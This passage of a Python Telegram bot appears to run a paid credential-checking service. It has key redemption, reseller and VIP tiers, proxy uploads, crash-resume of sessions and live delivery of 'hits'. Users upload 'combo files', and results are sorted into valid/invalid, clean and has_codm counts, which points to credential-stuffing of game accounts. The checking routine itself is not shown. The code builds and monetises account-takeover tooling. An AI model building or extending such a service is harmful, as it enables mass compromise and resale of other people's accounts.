        "mini_admins.json":      MINI_ADMINS_FILE,
        "resellers.json":        RESELLERS_FILE,
    }

    if not context.args:
        # No arg — enter "ready mode": next .json file sent will be auto-matched by filename
        with sessions_lock:
            active_sessions.setdefault(uid, {})
            active_sessions[uid]["awaiting_replace_file"] = "__auto__"
            active_sessions[uid]["awaiting_replace_path"] = "__auto__"

        file_list = "\n".join(
            f"  • <code>{name}</code>"
            + (f"  ({f.stat().st_size/1024:.1f} KB)" if f.exists() else "  (missing)")
            for name, f in REPLACEABLE.items())
        await update.message.reply_text(
            f" <b>Replace File — Ready!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"Just send any of these files directly now:\n\n"
            f"{file_list}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f" The filename is auto-detected from what you send.\n"
            f" Current file is backed up as <code>filename.json.bak</code> automatically.\n\n"
            f" Type /cancel_replace to abort.",
            parse_mode=ParseMode.HTML)
        return

    # Arg given — optional hint, same as before
    fname = context.args[0].strip().lower()
    if not fname.endswith(".json"):
        fname = fname + ".json"
    if fname not in REPLACEABLE:
        valid = ", ".join(f"<code>{n.replace('.json','')}</code>" for n in REPLACEABLE)
        await update.message.reply_text(
            f" Unknown file: <code>{context.args[0]}</code>\n"
            f"Valid: {valid}",
            parse_mode=ParseMode.HTML)
        return

    target_path = REPLACEABLE[fname]

    with sessions_lock:
        active_sessions.setdefault(uid, {})
        active_sessions[uid]["awaiting_replace_file"] = fname
        active_sessions[uid]["awaiting_replace_path"] = str(target_path)

    info = ""
    if target_path.exists():
        sz = target_path.stat().st_size
        sz_str = f"{sz/1024:.1f} KB" if sz < 1024*1024 else f"{sz/1024/1024:.2f} MB"
        info = f"\n Current size: <code>{sz_str}</code>"

    await update.message.reply_text(
        f" <b>Ready to Replace</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Target  : <code>{fname}</code>{info}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f" <b>Send your <code>{fname}</code> file now.</b>\n"
        f" Backed up as <code>{fname}.bak</code> automatically.\n\n"
        f" /cancel_replace to abort.",
        parse_mode=ParseMode.HTML)


@admin_only
async def cmd_cancel_replace(update, context):
    """Cancel a pending file replacement."""
    uid = str(update.effective_user.id)
    with sessions_lock:
        sess = active_sessions.get(uid, {})
        fname = sess.get("awaiting_replace_file")
        if fname:
            active_sessions[uid].pop("awaiting_replace_file", None)
            active_sessions[uid].pop("awaiting_replace_path", None)
            await update.message.reply_text(
                f" Replacement of <code>{fname}</code> cancelled.",
                parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text("ℹ No pending file replacement.")


@admin_only
async def cmd_set_commands(update, context):
    """Refresh command menu. Uses caller chat_id directly — always works."""
    msg = await update.message.reply_text(" Setting command menus…", parse_mode=ParseMode.HTML)
    cfg = load_config()

    user_cmds2 = [
        BotCommand("start",          " Start / Home"),
        BotCommand("redeem",         " Redeem a key"),
        BotCommand("check",          " Check progress"),
        BotCommand("stop",           " Stop checking"),
        BotCommand("status",         "ℹ Session status"),
        BotCommand("myresultsfile",  " Get current results file"),
        BotCommand("deletefile",     " Delete your combo file"),
        BotCommand("clean",          " Clean combo file"),
        BotCommand("cancel",         " Cancel session"),
        BotCommand("hitson",         " Enable hit notifications"),
        BotCommand("hitsoff",        " Disable hit notifications"),
    ]
    admin_cmds2 = user_cmds2 + [
        BotCommand("admin",          " Admin panel"),
        BotCommand("generate_key",   " Generate a key"),
        BotCommand("remove_key",     " Remove key(s)"),
        BotCommand("ban_user",       " Ban a user"),
        BotCommand("unban_user",     " Unban a user"),
        BotCommand("addvip",         " Add VIP"),
        BotCommand("removevip",      " Remove VIP"),
        BotCommand("lockall",        " Lock bot"),
        BotCommand("unlockall",      " Unlock bot"),
        BotCommand("stats",          " Bot statistics"),
        BotCommand("checkalluser",   " List all users"),
        BotCommand("checkrunning",   " Who is running"),
        BotCommand("stopchecking",   " Stop checking sessions"),
        BotCommand("continuechecking"," Continue stopped sessions"),
        BotCommand("stopforuser",    " Stop one user"),
        BotCommand("stopforvip",     " Stop VIP sessions"),
        BotCommand("stopnonvip",     " Stop non-VIP sessions"),
        BotCommand("broadcast",      " Broadcast message"),
        BotCommand("checkproxy",    " Check proxy file"),
        BotCommand("pasteproxy",    " Paste proxy lines"),
        BotCommand("upload_proxy",   " Upload proxy file"),
        BotCommand("proxystatus",    " Proxy file status"),
        BotCommand("removeproxy",    " Remove proxy file"),
        BotCommand("pasteproxy",     " Paste proxy lines"),
        BotCommand("checkproxy",     " Check proxy file"),
        BotCommand("reloadbot",      " Restart bot"),
        BotCommand("refreshcombo",   " Clear all combo files"),
        BotCommand("refreshresults", " Clear all results"),
        BotCommand("setlimit",       " Set line limit"),
        BotCommand("setlimitforvip", " Set VIP limit"),
        BotCommand("setcd",          " Set cooldown"),
        BotCommand("setconcurrent",  " Set concurrent slots"),
        BotCommand("refresh",        " Reload config & proxy"),
        BotCommand("setcommands",    " Refresh command menu"),
        BotCommand("reloadbot",      " Fully restart bot process"),
        BotCommand("senddata",       " Send data files"),
        BotCommand("replacefile",    " Replace a data file"),
        BotCommand("stopall",        " Stop all sessions"),
        BotCommand("continueall",    " Continue all stopped"),
        BotCommand("stopforvip",     " Stop all VIP sessions"),
        BotCommand("stopfornonvip",  " Stop all non-VIP sessions"),
        BotCommand("stopforuser",    " Stop/manage one user"),
        BotCommand("miniadminpanel",      " Add/manage mini admin"),
        BotCommand("removeminiadmin",     " Remove mini admin"),
        BotCommand("miniadminlist",       " List all mini admins"),
        BotCommand("miniadmininfo",       " Mini admin activity log"),
    ]

    reseller_cmds2 = [
        BotCommand("start",          " Start / Home"),
        BotCommand("redeem",         " Redeem a key"),
        BotCommand("check",          " Check progress"),
        BotCommand("stop",           " Stop checking"),
        BotCommand("status",         "ℹ Session status"),
        BotCommand("myresultsfile",  " Get current results file"),
        BotCommand("deletefile",     " Delete your combo file"),
        BotCommand("clean",          " Clean combo file"),
        BotCommand("cancel",         " Cancel session"),
        BotCommand("hitson",         " Enable hit notifications"),
        BotCommand("hitsoff",        " Disable hit notifications"),
        BotCommand("resellerpanel",  " Your reseller panel"),
        BotCommand("rgenkey",        " Generate a key"),
    ]

    errors = []
    reseller_ok = 0
    try:
        await context.bot.set_my_commands(user_cmds2)
        await context.bot.set_my_commands(user_cmds2, scope=BotCommandScopeAllPrivateChats())
        caller_id = int(update.effective_chat.id)
        await context.bot.set_my_commands(admin_cmds2, scope=BotCommandScopeChat(chat_id=caller_id))
        for admin_id in cfg.get("admin_ids", []):
            if int(admin_id) == caller_id: continue
            try:
                await context.bot.set_my_commands(admin_cmds2, scope=BotCommandScopeChat(chat_id=int(admin_id)))
            except Exception as e:
                errors.append(f"<code>{admin_id}</code>: {str(e)[:50]}")
        # Set reseller menus
        rs_db = load_resellers()
        for rs_uid, rd in rs_db.items():
            if not rd.get("active"): continue
            try:
                await context.bot.set_my_commands(reseller_cmds2, scope=BotCommandScopeChat(chat_id=int(rs_uid)))
                reseller_ok += 1
            except Exception as e:
                errors.append(f"reseller <code>{rs_uid}</code>: {str(e)[:50]}")
        text = (
            f" <b>Command menu updated!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f" Your menu now shows all admin commands.\n"
            f" Users see basic commands only.\n"
            f" Resellers updated: <code>{reseller_ok}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"ℹ Close and reopen the chat if menu hasn't changed."
        )
        if errors:
            text += "\n Failed:\n" + "\n".join(errors)
    except Exception as e:
        text = f" Failed: <code>{e}</code>"
    await msg.edit_text(text, parse_mode=ParseMode.HTML)

# ════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════
def main():
    cfg=load_config()
    if cfg["bot_token"]=="YOUR_BOT_TOKEN_HERE":
        print("="*55); print("    Set bot_token  in data/config.json")
        print("    Set admin_ids  in data/config.json"); print("="*55); sys.exit(1)
    saved_mc=cfg.get("max_concurrent",5)
    if saved_mc!=MAX_CONCURRENT_CHECKERS: rebuild_semaphore(saved_mc)
    if not cfg.get("admin_ids"): print("  No admin_ids set")
    if not CHECKER_OK:           print(f"  Checker unavailable: {CHECKER_ERR}")
    print(f"  Bot starting — @{cfg['channel_username']}  |  Slots: {MAX_CONCURRENT_CHECKERS}")

    app=(Application.builder()
         .token(cfg["bot_token"])
         .read_timeout(30).write_timeout(30)
         .connect_timeout(30).pool_timeout(30)
         .build())

    # ── Crash-resume: notify users their file is waiting ──────
    ps=load_persisted_sessions()
    if ps:
        log.info(f" Found {len(ps)} persisted session(s) — auto-resuming")
        async def _auto_resume(application):
            loop2=asyncio.get_event_loop()
            cfg2=load_config()
            for uid2, sd in list(load_persisted_sessions().items()):
                fpath=sd.get("file",""); cid2=sd.get("chat_id")
                lk2=sd.get("lvl_key","lvl_all"); ck2=sd.get("cf_key","cf_both")
                fname2=sd.get("first_name","User"); uname2=sd.get("username","")
                if not fpath or not cid2:
                    clear_persisted_session(uid2); continue
                if not Path(fpath).exists():
                    clear_persisted_session(uid2)
                    try:
                        await application.bot.send_message(
                            chat_id=int(cid2), parse_mode=ParseMode.HTML,
                            text=(f" <b>Session Recovery Failed</b>\n"
                                  f"━━━━━━━━━━━━━━━━━━━━\n"
                                  f"Hi <b>{fname2}</b>, the bot restarted but your combo "
                                  f"file was not found.\nPlease upload your file again via /start."))
                    except: pass
                    continue

                # ── Count remaining lines ─────────────────────────────
                try:
                    with open(fpath,"r",encoding="utf-8",errors="ignore") as _f:
                        rem2=sum(1 for ln in _f if ln.strip() and not ln.strip().startswith("==="))
                except: rem2=0

                # ── Guard: skip stale session if all lines already done ──
                _ckpt2 = Path(str(fpath) + ".ckpt")
                if _ckpt2.exists():
                    try:
                        with open(_ckpt2,"r",encoding="utf-8") as _cf:
                            _done2 = {int(l.strip()) for l in _cf if l.strip().isdigit()}
                        if rem2 > 0 and len(_done2) >= rem2:
                            log.info(f"Auto-resume uid={uid2}: all {rem2} lines already done "
                                     f"(checkpoint has {len(_done2)} entries) — cleaning up stale session")
                            clear_persisted_session(uid2)
                            try: _ckpt2.unlink()
                            except: pass
                            try:
                                await application.bot.send_message(
                                    chat_id=int(cid2), parse_mode=ParseMode.HTML,
                                    text=(f" <b>Session Already Complete</b>\n"
                                          f"━━━━━━━━━━━━━━━━━━━━\n"
                                          f"Hi <b>{fname2}</b>, your previous session had already "
                                          f"finished all <code>{rem2:,}</code> lines before the bot "
                                          f"restarted.\n\n"
                                          f" No new results to send.\n"
                                          f"Use /start to begin a new session."))
                            except: pass
                            continue
                    except: pass

                ll2=LEVEL_OPTIONS.get(lk2,LEVEL_OPTIONS["lvl_all"])["label"]
                cl2=LEVEL_OPTIONS.get(lk2,LEVEL_OPTIONS["lvl_all"])["threshold"]
                cl2_label=LEVEL_OPTIONS.get(lk2,LEVEL_OPTIONS["lvl_all"])["label"]
                clf2_label=CLEAN_OPTIONS.get(ck2,CLEAN_OPTIONS["cf_both"])["label"]
                thr2=LEVEL_OPTIONS.get(lk2,LEVEL_OPTIONS["lvl_all"])["threshold"]
                clf2=CLEAN_OPTIONS.get(ck2,CLEAN_OPTIONS["cf_both"])["filter"]
                threads2=cfg2.get("default_threads",5)
                udb2=load_users()
                _hits_on2=udb2.get(uid2,{}).get("hits_notif",False)
                btok2=cfg2["bot_token"] if _hits_on2 else None
                isv2=udb2.get(uid2,{}).get("vip",False) or is_admin(int(uid2),cfg2)
                lim2=cfg2.get("vip_limit") if isv2 else cfg2.get("global_limit")
                disp2=min(lim2,rem2) if lim2 else rem2
                combo2=Path(fpath)
                ts2=datetime.now().strftime("%Y%m%d_%H%M%S")
                saved_rf=sd.get("result_folder","")
                if saved_rf and Path(saved_rf).exists():
                    rf2=Path(saved_rf)
                    log.info(f"Resume: reusing existing result folder {rf2}")
                else:
                    rf2=RESULTS_DIR/uid2/ts2; rf2.mkdir(parents=True,exist_ok=True)
                    log.info(f"Resume: created new result folder {rf2}")
                saved_orig=sd.get("orig_total",rem2)
                if saved_orig<rem2: saved_orig=rem2
                prev_processed=max(0, saved_orig-rem2)
                stop_ev2=threading.Event()

                saved_snap=sd.get("live_stats_snapshot",{})
                prev_stats2=saved_snap if saved_snap else get_folder_stats(str(rf2))
                if prev_stats2:
                    prev_stats2.setdefault("valid",0); prev_stats2.setdefault("invalid",0)
                    prev_stats2.setdefault("clean",0); prev_stats2.setdefault("not_clean",0)
                    prev_stats2.setdefault("has_codm",0); prev_stats2.setdefault("no_codm",0)

                with sessions_lock:
                    active_sessions[uid2]={
                        "status":"checking","file":fpath,
                        "stop_event":stop_ev2,"chat_id":cid2,
                        "lvl_key":lk2,"cf_key":ck2,
                        "result_folder":str(rf2),
                        "orig_total":saved_orig,
                        "prev_processed":prev_processed,
                        "prev_stats":prev_stats2,
                    }

                try:
                    _,_,prev_hits=parse_result_stats(str(rf2))
                except: prev_hits=0
                if prev_hits==0 and prev_stats2:
                    prev_hits=prev_stats2.get("has_codm",0)
                try:
                    smsg2=await application.bot.send_message(
                        chat_id=int(cid2), parse_mode=ParseMode.HTML,
                        text=(f" <b>Auto-Resuming!</b>\n"
                              f"━━━━━━━━━━━━━━━━━━━━\n"
                              f" Hi <b>{fname2}</b>{'  @'+uname2 if uname2 else ''}\n"
                              f" File       : <code>{combo2.name}</code>\n"
                              f" Total lines: <code>{saved_orig:,}</code>\n"
                              f" Remaining  : <code>{rem2:,}</code> lines to process\n"
                              f" Pre-crash hits: <code>{prev_hits:,}</code> (preserved)\n"
                              f" Level      : {cl2_label}\n"
                              f" Filter     : {clf2_label}\n"
                              f"━━━━━━━━━━━━━━━━━━━━\n"
                              f" Hits sent here live!\n /check   /stop"))
                    smsg2_id = smsg2.message_id if smsg2 else None
                    if smsg2: track(uid2, smsg2_id)
                except Exception as e:
                    log.warning(f"Auto-resume notify failed for {uid2}: {e}")
                    smsg2_id = None

                persist_session(uid2, {
                    "file":fpath,"chat_id":cid2,"lvl_key":lk2,"cf_key":ck2,
                    "username":uname2,"first_name":fname2,
                    "status":"checking","status_msg_id":smsg2_id,
                    "result_folder":str(rf2),
                    "orig_total":saved_orig,
                    "live_stats_snapshot":prev_stats2,
                })

                _status_stop2=threading.Event()
                def _make_status_loop(u,combo_p,orig_n,prev_proc,ll_s,cl_s,cid_n,msg_id,sstop,rf_base,ts_base,prev_s=None):
                    _pc=[1]
                    def _loop():
                        while not sstop.wait(180):
                            with sessions_lock: s3=active_sessions.get(u,{})
                            if s3.get("status")!="checking": break
                            ls3=s3.get("live_stats")
                            if ls3 is not None:
                                cur3_raw=ls3.get_stats()
                                update_persisted_stats(u, cur3_raw)
                                curr3=cur3_raw.get("total",0)
                                done3=prev_proc+curr3
                                if orig_n and done3>orig_n: done3=orig_n
                                if prev_s:
                                    display3=dict(cur3_raw)
                                    for _k in ("valid","invalid","clean","not_clean","has_codm","no_codm"):
                                        display3[_k]=cur3_raw.get(_k,0)+prev_s.get(_k,0)
                                    display3["total"]=done3
                                else:
                                    display3=dict(cur3_raw)
                                    display3["total"]=done3
                                card3=stats_card(done3,orig_n,display3,ll_s,cl_s,
                                                 result_folder=str(rf_base))
                                if msg_id:
                                    try:
                                        asyncio.run_coroutine_threadsafe(
                                            application.bot.edit_message_text(
                                                chat_id=cid_n,message_id=msg_id,
                                                text=card3,parse_mode=ParseMode.HTML),loop2)
                                    except: pass
                            try:
                                cur_rf3=Path(s3.get("result_folder",str(rf_base)))
                                rfiles3=[f for f in cur_rf3.rglob("*")
                                         if f.is_file() and not f.name.endswith(".zip")]
                                fsz3=sum(f.stat().st_size for f in rfiles3)
                                if fsz3 >= int(TG_MAX_BYTES*0.85):
                                    pz3=cur_rf3/f"results_{u}_{ts_base}_auto{_pc[0]}.zip"
                                    with zipfile.ZipFile(pz3,"w",zipfile.ZIP_DEFLATED) as zf:
                                        for f in rfiles3: zf.write(f,f.relative_to(cur_rf3))
                                    ls4=s3.get("live_stats")
                                    snap4=ls4.get_stats() if ls4 else {}
                                    asyncio.run_coroutine_threadsafe(
                                        deliver_results(application.bot,cid_n,u,[pz3],snap4,
                                                        combo_file=None,partial=True),loop2)
                                    for f in rfiles3:
                                        try: f.unlink()
                                        except: pass
                                    _pc[0]+=1
                            except: pass
                    return _loop
                threading.Thread(
                    target=_make_status_loop(uid2,fpath,saved_orig,prev_processed,
                                             cl2_label,clf2_label,int(cid2),smsg2_id,
                                             _status_stop2,rf2,ts2,prev_s=prev_stats2),
                    daemon=True,name=f"status-{uid2}").start()

                def _make_bg(u,combo_p,rf_p,lim_n,thr_n,stop_e,btok_n,cid_n,
                              thr_list,clf_n,orig_n,prev_proc,ts_n,smsg_id,sstop,ll_s,cl_s,prev_s=None):
                    def _bg():
                        _enqueue(u)
                        pos=_queue_pos(u)
                        if pos>1:
                            asyncio.run_coroutine_threadsafe(application.bot.send_message(
                                chat_id=cid_n,
                                text=f" <b>Queue Position: #{pos}</b>\nWaiting for a free slot…\nUse /stop to cancel.",
                                parse_mode=ParseMode.HTML),loop2)
                        _mem_wait = 0
                        while _mem_pressure.is_set() and _mem_wait < 300:
                            if stop_e.is_set(): break
                            time.sleep(5); _mem_wait += 5
                        _mem_wait2 = 0
                        while _mem_pressure.is_set() and _mem_wait2 < 300:
                            if stop_e.is_set(): break
                            time.sleep(5); _mem_wait2 += 5
                        _checker_semaphore.acquire(); _dequeue(u)
                        with sessions_lock:
                            if active_sessions.get(u,{}).get("status")!="checking" or stop_e.is_set():
                                _checker_semaphore.release(); sstop.set(); return
                        try:
                            st3=run_checker(u,Path(combo_p),rf_p,lim_n,thr_n,stop_e,
                                            btok_n,cid_n,thr_list,clf_n,is_resume=True)
                            final_stats=dict(st3)
                            if prev_s:
                                for _k in ("valid","invalid","clean","not_clean","has_codm","no_codm"):
                                    final_stats[_k]=st3.get(_k,0)+prev_s.get(_k,0)
                            final_stats["total"]=prev_proc+st3.get("total",0)
                            st3=final_stats
                            u3=load_users()
                            if u in u3:
                                u3[u]["total_checked"]+=st3.get("total",0)
                                u3[u]["sessions_count"]+=1; save_users(u3)
                            zo3=rf_p/f"results_{u}_{ts_n}.zip"
                            zp3=zip_results(rf_p,zo3)
                            note3=" (Stopped)" if stop_e.is_set() else ""
                            asyncio.run_coroutine_threadsafe(
                                deliver_results(application.bot,cid_n,u,zp3,st3,
                                                combo_file=Path(combo_p),note=note3),loop2)
                        except Exception as ex3:
                            asyncio.run_coroutine_threadsafe(application.bot.send_message(
                                chat_id=cid_n,
                                text=f" <b>Error:</b> <code>{str(ex3)[:300]}</code>",
                                parse_mode=ParseMode.HTML),loop2)
                        finally:
                            sstop.set()
                            _checker_semaphore.release()
                            inc_session(u)
                            del_combo(Path(combo_p))
                            clear_persisted_session(u)
                            with sessions_lock:
                                if u in active_sessions:
                                    active_sessions[u]["status"]="done"
                                    try:
                                        _ls=active_sessions[u].get("live_stats")
                                        _ps2=active_sessions[u].get("prev_stats",{})
                                        _pp2=active_sessions[u].get("prev_processed",0)
                                        _cs2=_ls.get_stats() if _ls else {}
                                        _fs2=dict(_cs2)
                                        if _ps2:
                                            for _k in ("valid","invalid","clean","not_clean","has_codm","no_codm"):
                                                _fs2[_k]=_cs2.get(_k,0)+_ps2.get(_k,0)
                                        _fs2["total"]=_pp2+_cs2.get("total",0)
                                        active_sessions[u]["final_stats"]=_fs2
                                    except: pass
                    return _bg

                t2=threading.Thread(
                    target=_make_bg(uid2,fpath,rf2,lim2,threads2,stop_ev2,btok2,
                                    int(cid2),thr2,clf2,saved_orig,prev_processed,
                                    ts2,smsg2_id,_status_stop2,cl2_label,clf2_label,
                                    prev_s=prev_stats2),
                    daemon=True,name=f"checker-{uid2}")
                t2.start()
                with sessions_lock:
                    active_sessions[uid2]["thread"]=t2

                log.info(f" Auto-resumed checker for uid={uid2} file={Path(fpath).name} rem={rem2:,}")
                await asyncio.sleep(0.5)

        _orig_auto_resume = _auto_resume
        async def _post_init_all(app2):
            await _orig_auto_resume(app2)
            await _set_bot_commands(app2)
        app.post_init = _post_init_all
    else:
        app.post_init = _set_bot_commands

    def _register_handlers(application):
        # ── User ──────────────────────────────────────────────────────────
        application.add_handler(CommandHandler("start",           cmd_start))
        application.add_handler(CommandHandler("redeem",          cmd_redeem))
        application.add_handler(CommandHandler("stop",            cmd_stop))
        application.add_handler(CommandHandler("cancel",          cmd_cancel))
        application.add_handler(CommandHandler("hitson",          cmd_hits_on))
        application.add_handler(CommandHandler("hitsoff",         cmd_hits_off))
        application.add_handler(CommandHandler("deletefile",      cmd_delete_file))
        application.add_handler(CommandHandler("status",          cmd_status))
        application.add_handler(CommandHandler("check",           cmd_check))
        application.add_handler(CommandHandler("myresultsfile",   cmd_myresultsfile))
        application.add_handler(CommandHandler("clean",           cmd_clean))
        application.add_handler(CommandHandler("myinfo",          cmd_myinfo))
        application.add_handler(CommandHandler("help",            cmd_help))
        application.add_handler(CommandHandler("announcement",    cmd_announcement))
        # ── Reseller (resellers only) ──────────────────────────────────────
        application.add_handler(CommandHandler("rgenkey",         cmd_reseller_gen_key))
        # ── Admin ──────────────────────────────────────────────────────────
        application.add_handler(CommandHandler("generate_key",    cmd_generate_key))
        application.add_handler(CommandHandler("remove_key",      cmd_remove_key))
        application.add_handler(CommandHandler("ban_user",        cmd_ban_user))
        application.add_handler(CommandHandler("unban_user",      cmd_unban_user))
        application.add_handler(CommandHandler(["lockAll","lockall"],    cmd_lock_all))
        application.add_handler(CommandHandler(["unlockAll","unlockall"],cmd_unlock_all))
        application.add_handler(CommandHandler("stopall",         cmd_stop_all_checking))
        application.add_handler(CommandHandler("continueall",     cmd_continue_all_checking))
        application.add_handler(CommandHandler("stopforvip",      cmd_stop_for_vip))
        application.add_handler(CommandHandler("stopfornonvip",   cmd_stop_for_nonvip))
        application.add_handler(CommandHandler("stopforuser",     cmd_stop_for_user))
        application.add_handler(CommandHandler("addvip",          cmd_add_vip))
        application.add_handler(CommandHandler("removevip",       cmd_remove_vip))
        application.add_handler(CommandHandler("checkalluser",    cmd_check_all_users))
        application.add_handler(CommandHandler("stats",           cmd_stats))
        application.add_handler(CommandHandler("broadcast",       cmd_broadcast))

        application.add_handler(CommandHandler("setlimit",        cmd_set_limit))
        application.add_handler(CommandHandler("setlimitforvip",  cmd_set_limit_vip))
        application.add_handler(CommandHandler("setcd",           cmd_set_cd))
        application.add_handler(CommandHandler("userinfo",        cmd_userinfo))
        application.add_handler(CommandHandler("topusers",        cmd_topusers))
        application.add_handler(CommandHandler("sysinfo",         cmd_sysinfo))
        application.add_handler(CommandHandler("maintenance",     cmd_maintenance))
        application.add_handler(CommandHandler("setannouncement", cmd_set_announcement))
        application.add_handler(CommandHandler("setmlimit",       cmd_set_mlimit))
        application.add_handler(CommandHandler("keyinfo",         cmd_keyinfo))
        application.add_handler(CommandHandler("batchkey",        cmd_batchkey))
        application.add_handler(CommandHandler("usernote",        cmd_usernote))
        application.add_handler(CommandHandler("setuserlimit",    cmd_set_user_limit))
        application.add_handler(CommandHandler("setconcurrent",   cmd_set_concurrent))
        application.add_handler(CommandHandler("stopchecking",    cmd_stop_checking))
        application.add_handler(CommandHandler("continuechecking",cmd_continue_checking))
        application.add_handler(CommandHandler("stopnonvip",      cmd_stop_nonvip))
        application.add_handler(CommandHandler("refreshcombo",    cmd_refresh_combo))
        application.add_handler(CommandHandler("refreshresults",  cmd_refresh_results))
        application.add_handler(CommandHandler("checkrunning",    cmd_check_running))
        application.add_handler(CommandHandler("checkproxy",      cmd_check_proxy))
        application.add_handler(CommandHandler("pasteproxy",      cmd_paste_proxy))
        application.add_handler(CommandHandler("upload_proxy",    cmd_upload_proxy))
        application.add_handler(CommandHandler("proxystatus",     cmd_proxy_status))
        application.add_handler(CommandHandler("removeproxy",     cmd_remove_proxy))
        application.add_handler(CommandHandler("admin",           cmd_admin_panel))
        application.add_handler(CommandHandler("reloadbot",       cmd_reload_bot))
        application.add_handler(CommandHandler("refresh",         cmd_refresh))
        application.add_handler(CommandHandler("setcommands",     cmd_set_commands))
        application.add_handler(CommandHandler("senddata",        cmd_send_data))
        application.add_handler(CommandHandler("replacefile",     cmd_replace_file))
        application.add_handler(CommandHandler("cancel_replace",  cmd_cancel_replace))
        # ── Reseller Panel (admin manages resellers) ───────────────────────
        application.add_handler(CommandHandler("miniadminpanel",      cmd_mini_admin_panel))
        application.add_handler(CommandHandler("removeminiadmin",     cmd_remove_mini_admin))
        application.add_handler(CommandHandler("miniadminlist",       cmd_mini_admin_list))
        application.add_handler(CommandHandler("miniadmininfo",       cmd_mini_admin_info))
        application.add_handler(CommandHandler("demo",            cmd_demo))
        application.add_handler(CommandHandler("buy",             cmd_buy))
        # ── Message / callback handlers ────────────────────────────────────
        application.add_handler(MessageHandler(filters.PHOTO,                  on_photo))
        application.add_handler(MessageHandler(filters.Document.ALL,           on_document))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
        application.add_handler(CallbackQueryHandler(on_callback))

    _register_handlers(app)

    print("  Bot is live! Ctrl+C to stop.\n")
    try:
        app.run_polling(allowed_updates=Update.ALL_TYPES,
                        drop_pending_updates=False)
    except Exception as e:
        import traceback
        traceback.print_exc()
        print("\nBot crashed. Press Enter to exit.")
        input()

if __name__ == "__main__":
    main()